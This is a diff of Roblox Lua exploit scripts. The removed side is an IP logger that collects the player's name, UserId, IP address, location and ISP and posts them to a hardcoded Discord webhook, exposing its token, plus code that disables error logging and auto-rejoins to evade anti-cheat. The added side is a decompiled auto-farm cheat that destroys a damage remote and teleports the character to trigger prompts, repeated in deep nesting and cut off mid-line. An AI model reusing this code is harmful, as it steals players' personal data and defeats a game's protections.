@@ -1,279 +1,1075 @@
--- // BYPASS / ANTI-CHEAT SECTION // --
+-- ts file was generated at discord.gg/25ms
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player_name = Players.LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1410323480523571300/nhqFfhINJE3EFiuUHHluSdxYPBIFpQ3a0YwaA5E039sye6EzwdRPSNwXH9IHw_hWo-XZ"
+for _4, _4_2 in ipairs(workspace:GetDescendants())do
+    _4_2:IsA('Seat')
 
-local request = syn and syn.request or http_request or request or fluxus and fluxus.request
+    _4_2.Disabled = true
+end
 
--- Envia log pro Discord (muito comum em scripts maliciosos)
-local ip_info = request({ Url = "http://ip-api.com/json", Method = "GET" })
-local ipinfo_table = HttpService:JSONDecode(ip_info.Body)
+workspace.ChildAdded:Connect(function(...)
+    local _10_vararg1 = ...
 
-local embed = {
-    ["username"] = "📡 Vea Boquetera",
-    ["avatar_url"] = "https://media.discordapp.net/attachments/1410305233170464788/1410324367954546909/IMG_20250228_225159.jpg?...",
-    ["embeds"] = {{
-        ["title"] = "Novo Log Capturado",
-        ["description"] = "Dados de conexão obtidos com sucesso.",
-        ["color"] = tonumber(0x2F3136),
-        ["fields"] = {
-            {["name"] = "👤 Usuário", ["value"] = "`" .. player_name .. "`", ["inline"] = true},
-            {["name"] = "🆔 UserId", ["value"] = "`" .. Players.LocalPlayer.UserId .. "`", ["inline"] = true},
-            {["name"] = "🌍 IP", ["value"] = "`" .. ipinfo_table.query .. "`", ["inline"] = false},
-            {["name"] = "🏳 País", ["value"] = ipinfo_table.country .. " (" .. ipinfo_table.countryCode .. ")", ["inline"] = true},
-            {["name"] = "📍 Local", ["value"] = ipinfo_table.city .. ", " .. ipinfo_table.regionName, ["inline"] = true},
-            {["name"] = "🏢 ISP", ["value"] = ipinfo_table.isp, ["inline"] = true},
-            {["name"] = "🏢 Org", ["value"] = ipinfo_table.org, ["inline"] = true}
-        },
-        ["footer"] = { ["text"] = "Logger • " .. os.date("%d/%m/%Y %H:%M:%S") },
-        ["thumbnail"] = {["url"] = "https://media.discordapp.net/attachments/..."}
-    }}
-}
+    task.wait(0.2)
+    _10_vararg1:IsA('Seat')
 
-request({
-    Url = webhook_url,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode(embed)
+    _10_vararg1.Disabled = true
+end)
+game:GetService('ReplicatedStorage'):FindFirstChild('ReceberDano'):Destroy()
+
+local _call20 = Vector3.new(3314, 4, 3026)
+local _call22 = game:GetService('TweenService')
+local _call30 = game:GetService('Players').LocalPlayer.Character:WaitForChild('HumanoidRootPart')
+
+game:GetService('UserInputService').InputBegan:Connect(function(...) end)
+
+local _call46 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+    CFrame = CFrame.new(_call20),
 })
 
--- Serviços clonados (muito usado em exploits para evitar detecção)
-local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
-local TeleportService  = cloneref(game:GetService("TeleportService"))
-local ScriptContext    = cloneref(game:GetService("ScriptContext"))
-local StarterPlayer    = cloneref(game:GetService("StarterPlayer"))
-local GuiService       = cloneref(game:GetService("GuiService"))
-local RunService       = cloneref(game:GetService("RunService"))
-local LogService       = cloneref(game:GetService("LogService"))
-local Workspace        = cloneref(game:GetService("Workspace"))
-local CoreGui          = cloneref(game:GetService("CoreGui"))
-local Players          = cloneref(game:GetService("Players"))
+_call46:Play()
+_call46.Completed:Wait()
+wait(0.3)
+fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+wait(2)
 
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+for _64, _64_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+    _64_2:FindFirstChild('OrderChar')
 
--- Instâncias que o script tenta proteger / bloquear
-local TesteAnti    = ReplicatedStorage:FindFirstChild("TesteAnti")
-local ChatService  = LocalPlayer.PlayerScripts:FindFirstChild("ChatService")
-local ChatService2 = StarterPlayer.StarterPlayerScripts:FindFirstChild("ChatService")
+    local _70 = (_64_2.Position + Vector3.new(0, 3, 0))
+    local _call82 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _70).Magnitude / 75), Enum.EasingStyle.Linear), {
+        CFrame = CFrame.new(_70),
+    })
 
--- Remotes e métodos bloqueados
-local BlockedRemotes = { "TesteAnti", "ChatService" }
-local BlockedKeys = {
-    Fire = true, Invoke = true, FireServer = true, InvokeServer = true,
-    GetPropertyChangedSignal = true, WaitForChild = true, Destroy = true,
-    Remove = true, IsDescendantOf = true, FindFirstChild = true,
-    FindFirstChildWhichIsA = true, FindFirstChildOfClass = true,
-    AncestryChanged = true, Parent = true, Kick = true
-}
+    _call82:Play()
+    _call82.Completed:Wait()
+    wait(0.3)
+    fireproximityprompt(_64_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+    print('Prompt no pad ativado.')
+    wait(19.997162488522008)
 
-local BlockedInstances = {}
+    local _call103 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+        CFrame = CFrame.new(_call20),
+    })
 
--- API de bypass
-local AdvancedBypassAPI, Connections = {}, {}
+    _call103:Play()
+    _call103.Completed:Wait()
+    wait(0.3)
+    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+    wait(2)
 
-function AdvancedBypassAPI:SetConnection(type, callback)
-    local conn = type:Connect(callback)
-    table.insert(Connections, conn)
-    return conn
-end
+    for _121, _121_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+        _121_2:FindFirstChild('OrderChar')
 
-function AdvancedBypassAPI:Disconnect(Data)
-    for i, v in ipairs(Connections) do
-        if v == Data then
-            v:Disconnect()
-            table.remove(Connections, i)
-            break
-        end
-    end
-end
+        local _127 = (_121_2.Position + Vector3.new(0, 3, 0))
+        local _call139 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _127).Magnitude / 75), Enum.EasingStyle.Linear), {
+            CFrame = CFrame.new(_127),
+        })
 
-function AdvancedBypassAPI:DisconnectAll()
-    for _, v in ipairs(Connections) do v:Disconnect() end
-    table.clear(Connections)
-end
+        _call139:Play()
+        _call139.Completed:Wait()
+        wait(0.3)
+        fireproximityprompt(_121_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+        print('Prompt no pad ativado.')
+        wait(19.996866361703724)
 
-function AdvancedBypassAPI:ClientIDHadler(length)
-    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-    local str = ""
-    for _ = 1, length do
-        str = str .. chars:sub(math.random(1, #chars), math.random(1, #chars))
-    end
-    return str
-end
+        local _call160 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+            CFrame = CFrame.new(_call20),
+        })
 
-function AdvancedBypassAPI:RejoinClient()
-    print("Rejoining...")
-    task.wait(0.1)
-    task.spawn(function()
-        if Players.NumPlayers > 1 then
-            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
-        else
-            TeleportService:Teleport(game.PlaceId, LocalPlayer)
-        end
-    end)
-    LocalPlayer:Kick("You just ascended -> rejoining...")
-end
+        _call160:Play()
+        _call160.Completed:Wait()
+        wait(0.3)
+        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+        wait(2)
 
--- Desativa conexões de erro (tenta burlar anti-cheat que loga erros)
-for _, conn in ipairs(getconnections(ScriptContext.Error)) do
-    pcall(function() conn:Disable() end)
-end
+        for _178, _178_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+            _178_2:FindFirstChild('OrderChar')
 
-for _, conn in ipairs(getconnections(LogService.MessageOut)) do
-    pcall(function() conn:Disconnect() end)
-end
+            local _184 = (_178_2.Position + Vector3.new(0, 3, 0))
+            local _call196 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _184).Magnitude / 75), Enum.EasingStyle.Linear), {
+                CFrame = CFrame.new(_184),
+            })
 
--- Reconexão automática ao tomar kick/desconexão
-local promptGui = CoreGui:FindFirstChild("RobloxPromptGui")
-local promptOverlay = promptGui and promptGui:FindFirstChild("promptOverlay")
+            _call196:Play()
+            _call196.Completed:Wait()
+            wait(0.3)
+            fireproximityprompt(_178_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+            print('Prompt no pad ativado.')
+            wait(19.996748748701066)
 
-if promptOverlay then
-    promptOverlay.DescendantAdded:Connect(function(desc)
-        if desc.Name == "ErrorTitle" then
-            desc:GetPropertyChangedSignal("Text"):Connect(function()
-                if desc.Text:find("^Disconnected") then
-                    AdvancedBypassAPI:RejoinClient()
+            local _call217 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                CFrame = CFrame.new(_call20),
+            })
+
+            _call217:Play()
+            _call217.Completed:Wait()
+            wait(0.3)
+            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+            wait(2)
+
+            for _235, _235_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                _235_2:FindFirstChild('OrderChar')
+
+                local _241 = (_235_2.Position + Vector3.new(0, 3, 0))
+                local _call253 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _241).Magnitude / 75), Enum.EasingStyle.Linear), {
+                    CFrame = CFrame.new(_241),
+                })
+
+                _call253:Play()
+                _call253.Completed:Wait()
+                wait(0.3)
+                fireproximityprompt(_235_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                print('Prompt no pad ativado.')
+                wait(19.994945446960628)
+
+                local _call274 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                    CFrame = CFrame.new(_call20),
+                })
+
+                _call274:Play()
+                _call274.Completed:Wait()
+                wait(0.3)
+                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                wait(2)
+
+                for _292, _292_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                    _292_2:FindFirstChild('OrderChar')
+
+                    local _298 = (_292_2.Position + Vector3.new(0, 3, 0))
+                    local _call310 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _298).Magnitude / 75), Enum.EasingStyle.Linear), {
+                        CFrame = CFrame.new(_298),
+                    })
+
+                    _call310:Play()
+                    _call310.Completed:Wait()
+                    wait(0.3)
+                    fireproximityprompt(_292_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                    print('Prompt no pad ativado.')
+                    wait(19.995444113621488)
+
+                    local _call331 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                        CFrame = CFrame.new(_call20),
+                    })
+
+                    _call331:Play()
+                    _call331.Completed:Wait()
+                    wait(0.3)
+                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                    wait(2)
+
+                    for _349, _349_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                        _349_2:FindFirstChild('OrderChar')
+
+                        local _355 = (_349_2.Position + Vector3.new(0, 3, 0))
+                        local _call367 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _355).Magnitude / 75), Enum.EasingStyle.Linear), {
+                            CFrame = CFrame.new(_355),
+                        })
+
+                        _call367:Play()
+                        _call367.Completed:Wait()
+                        wait(0.3)
+                        fireproximityprompt(_349_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                        print('Prompt no pad ativado.')
+                        wait(19.994981484953314)
+
+                        local _call388 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                            CFrame = CFrame.new(_call20),
+                        })
+
+                        _call388:Play()
+                        _call388.Completed:Wait()
+                        wait(0.3)
+                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                        wait(2)
+
+                        for _406, _406_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                            _406_2:FindFirstChild('OrderChar')
+
+                            local _412 = (_406_2.Position + Vector3.new(0, 3, 0))
+                            local _call424 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _412).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                CFrame = CFrame.new(_412),
+                            })
+
+                            _call424:Play()
+                            _call424.Completed:Wait()
+                            wait(0.3)
+                            fireproximityprompt(_406_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                            print('Prompt no pad ativado.')
+                            wait(19.996085535967723)
+
+                            local _call445 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                CFrame = CFrame.new(_call20),
+                            })
+
+                            _call445:Play()
+                            _call445.Completed:Wait()
+                            wait(0.3)
+                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                            wait(2)
+
+                            for _463, _463_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                _463_2:FindFirstChild('OrderChar')
+
+                                local _469 = (_463_2.Position + Vector3.new(0, 3, 0))
+                                local _call481 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _469).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                    CFrame = CFrame.new(_469),
+                                })
+
+                                _call481:Play()
+                                _call481.Completed:Wait()
+                                wait(0.3)
+                                fireproximityprompt(_463_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                print('Prompt no pad ativado.')
+                                wait(19.99571649474092)
+
+                                local _call502 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                    CFrame = CFrame.new(_call20),
+                                })
+
+                                _call502:Play()
+                                _call502.Completed:Wait()
+                                wait(0.3)
+                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                wait(2)
+
+                                for _520, _520_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                    _520_2:FindFirstChild('OrderChar')
+
+                                    local _526 = (_520_2.Position + Vector3.new(0, 3, 0))
+                                    local _call538 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _526).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                        CFrame = CFrame.new(_526),
+                                    })
+
+                                    _call538:Play()
+                                    _call538.Completed:Wait()
+                                    wait(0.3)
+                                    fireproximityprompt(_520_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                    print('Prompt no pad ativado.')
+                                    wait(19.994983719894662)
+
+                                    local _call559 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                        CFrame = CFrame.new(_call20),
+                                    })
+
+                                    _call559:Play()
+                                    _call559.Completed:Wait()
+                                    wait(0.3)
+                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                    wait(2)
+
+                                    for _577, _577_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                        _577_2:FindFirstChild('OrderChar')
+
+                                        local _583 = (_577_2.Position + Vector3.new(0, 3, 0))
+                                        local _call595 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _583).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                            CFrame = CFrame.new(_583),
+                                        })
+
+                                        _call595:Play()
+                                        _call595.Completed:Wait()
+                                        wait(0.3)
+                                        fireproximityprompt(_577_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                        print('Prompt no pad ativado.')
+                                        wait(19.99447611346841)
+
+                                        local _call616 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                            CFrame = CFrame.new(_call20),
+                                        })
+
+                                        _call616:Play()
+                                        _call616.Completed:Wait()
+                                        wait(0.3)
+                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                        wait(2)
+
+                                        for _634, _634_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                            _634_2:FindFirstChild('OrderChar')
+
+                                            local _640 = (_634_2.Position + Vector3.new(0, 3, 0))
+                                            local _call652 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _640).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                CFrame = CFrame.new(_640),
+                                            })
+
+                                            _call652:Play()
+                                            _call652.Completed:Wait()
+                                            wait(0.3)
+                                            fireproximityprompt(_634_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                            print('Prompt no pad ativado.')
+                                            wait(19.99475100892596)
+
+                                            local _call673 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                CFrame = CFrame.new(_call20),
+                                            })
+
+                                            _call673:Play()
+                                            _call673.Completed:Wait()
+                                            wait(0.3)
+                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                            wait(2)
+
+                                            for _691, _691_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                _691_2:FindFirstChild('OrderChar')
+
+                                                local _697 = (_691_2.Position + Vector3.new(0, 3, 0))
+                                                local _call709 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _697).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                    CFrame = CFrame.new(_697),
+                                                })
+
+                                                _call709:Play()
+                                                _call709.Completed:Wait()
+                                                wait(0.3)
+                                                fireproximityprompt(_691_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                print('Prompt no pad ativado.')
+                                                wait(19.995793040608987)
+
+                                                local _call730 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                    CFrame = CFrame.new(_call20),
+                                                })
+
+                                                _call730:Play()
+                                                _call730.Completed:Wait()
+                                                wait(0.3)
+                                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                wait(2)
+
+                                                for _748, _748_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                    _748_2:FindFirstChild('OrderChar')
+
+                                                    local _754 = (_748_2.Position + Vector3.new(0, 3, 0))
+                                                    local _call766 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _754).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                        CFrame = CFrame.new(_754),
+                                                    })
+
+                                                    _call766:Play()
+                                                    _call766.Completed:Wait()
+                                                    wait(0.3)
+                                                    fireproximityprompt(_748_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                    print('Prompt no pad ativado.')
+                                                    wait(19.996050336165354)
+
+                                                    local _call787 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                        CFrame = CFrame.new(_call20),
+                                                    })
+
+                                                    _call787:Play()
+                                                    _call787.Completed:Wait()
+                                                    wait(0.3)
+                                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                    wait(2)
+
+                                                    for _805, _805_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                        _805_2:FindFirstChild('OrderChar')
+
+                                                        local _811 = (_805_2.Position + Vector3.new(0, 3, 0))
+                                                        local _call823 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _811).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                            CFrame = CFrame.new(_811),
+                                                        })
+
+                                                        _call823:Play()
+                                                        _call823.Completed:Wait()
+                                                        wait(0.3)
+                                                        fireproximityprompt(_805_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                        print('Prompt no pad ativado.')
+                                                        wait(19.995628215372562)
+
+                                                        local _call844 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                            CFrame = CFrame.new(_call20),
+                                                        })
+
+                                                        _call844:Play()
+                                                        _call844.Completed:Wait()
+                                                        wait(0.3)
+                                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                        wait(2)
+
+                                                        for _862, _862_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                            _862_2:FindFirstChild('OrderChar')
+
+                                                            local _868 = (_862_2.Position + Vector3.new(0, 3, 0))
+                                                            local _call880 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _868).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                CFrame = CFrame.new(_868),
+                                                            })
+
+                                                            _call880:Play()
+                                                            _call880.Completed:Wait()
+                                                            wait(0.3)
+                                                            fireproximityprompt(_862_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                            print('Prompt no pad ativado.')
+                                                            wait(19.99564022803679)
+
+                                                            local _call901 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                CFrame = CFrame.new(_call20),
+                                                            })
+
+                                                            _call901:Play()
+                                                            _call901.Completed:Wait()
+                                                            wait(0.3)
+                                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                            wait(2)
+
+                                                            for _919, _919_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                _919_2:FindFirstChild('OrderChar')
+
+                                                                local _925 = (_919_2.Position + Vector3.new(0, 3, 0))
+                                                                local _call937 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _925).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                    CFrame = CFrame.new(_925),
+                                                                })
+
+                                                                _call937:Play()
+                                                                _call937.Completed:Wait()
+                                                                wait(0.3)
+                                                                fireproximityprompt(_919_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                print('Prompt no pad ativado.')
+                                                                wait(19.99555250746198)
+
+                                                                local _call958 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                    CFrame = CFrame.new(_call20),
+                                                                })
+
+                                                                _call958:Play()
+                                                                _call958.Completed:Wait()
+                                                                wait(0.3)
+                                                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                wait(2)
+
+                                                                for _976, _976_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                    _976_2:FindFirstChild('OrderChar')
+
+                                                                    local _982 = (_976_2.Position + Vector3.new(0, 3, 0))
+                                                                    local _call994 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _982).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                        CFrame = CFrame.new(_982),
+                                                                    })
+
+                                                                    _call994:Play()
+                                                                    _call994.Completed:Wait()
+                                                                    wait(0.3)
+                                                                    fireproximityprompt(_976_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                    print('Prompt no pad ativado.')
+                                                                    wait(19.99611794250086)
+
+                                                                    local _call1015 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                        CFrame = CFrame.new(_call20),
+                                                                    })
+
+                                                                    _call1015:Play()
+                                                                    _call1015.Completed:Wait()
+                                                                    wait(0.3)
+                                                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                    wait(2)
+
+                                                                    for _1033, _1033_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                        _1033_2:FindFirstChild('OrderChar')
+
+                                                                        local _1039 = (_1033_2.Position + Vector3.new(0, 3, 0))
+                                                                        local _call1051 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1039).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                            CFrame = CFrame.new(_1039),
+                                                                        })
+
+                                                                        _call1051:Play()
+                                                                        _call1051.Completed:Wait()
+                                                                        wait(0.3)
+                                                                        fireproximityprompt(_1033_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                        print('Prompt no pad ativado.')
+                                                                        wait(19.993843072326854)
+
+                                                                        local _call1072 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                            CFrame = CFrame.new(_call20),
+                                                                        })
+
+                                                                        _call1072:Play()
+                                                                        _call1072.Completed:Wait()
+                                                                        wait(0.3)
+                                                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                        wait(2)
+
+                                                                        for _1090, _1090_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                            _1090_2:FindFirstChild('OrderChar')
+
+                                                                            local _1096 = (_1090_2.Position + Vector3.new(0, 3, 0))
+                                                                            local _call1108 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1096).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                CFrame = CFrame.new(_1096),
+                                                                            })
+
+                                                                            _call1108:Play()
+                                                                            _call1108.Completed:Wait()
+                                                                            wait(0.3)
+                                                                            fireproximityprompt(_1090_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                            print('Prompt no pad ativado.')
+                                                                            wait(19.995391593081877)
+
+                                                                            local _call1129 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                CFrame = CFrame.new(_call20),
+                                                                            })
+
+                                                                            _call1129:Play()
+                                                                            _call1129.Completed:Wait()
+                                                                            wait(0.3)
+                                                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                            wait(2)
+
+                                                                            for _1147, _1147_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                _1147_2:FindFirstChild('OrderChar')
+
+                                                                                local _1153 = (_1147_2.Position + Vector3.new(0, 3, 0))
+                                                                                local _call1165 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1153).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                    CFrame = CFrame.new(_1153),
+                                                                                })
+
+                                                                                _call1165:Play()
+                                                                                _call1165.Completed:Wait()
+                                                                                wait(0.3)
+                                                                                fireproximityprompt(_1147_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                print('Prompt no pad ativado.')
+                                                                                wait(19.99551227875054)
+
+                                                                                local _call1186 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                    CFrame = CFrame.new(_call20),
+                                                                                })
+
+                                                                                _call1186:Play()
+                                                                                _call1186.Completed:Wait()
+                                                                                wait(0.3)
+                                                                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                wait(2)
+
+                                                                                for _1204, _1204_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                    _1204_2:FindFirstChild('OrderChar')
+
+                                                                                    local _1210 = (_1204_2.Position + Vector3.new(0, 3, 0))
+                                                                                    local _call1222 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1210).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                        CFrame = CFrame.new(_1210),
+                                                                                    })
+
+                                                                                    _call1222:Play()
+                                                                                    _call1222.Completed:Wait()
+                                                                                    wait(0.3)
+                                                                                    fireproximityprompt(_1204_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                    print('Prompt no pad ativado.')
+                                                                                    wait(19.994982602540404)
+
+                                                                                    local _call1243 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                        CFrame = CFrame.new(_call20),
+                                                                                    })
+
+                                                                                    _call1243:Play()
+                                                                                    _call1243.Completed:Wait()
+                                                                                    wait(0.3)
+                                                                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                    wait(2)
+
+                                                                                    for _1261, _1261_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                        _1261_2:FindFirstChild('OrderChar')
+
+                                                                                        local _1267 = (_1261_2.Position + Vector3.new(0, 3, 0))
+                                                                                        local _call1279 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1267).Magnitude / 75), Enum.EasingStyle.Linear), {
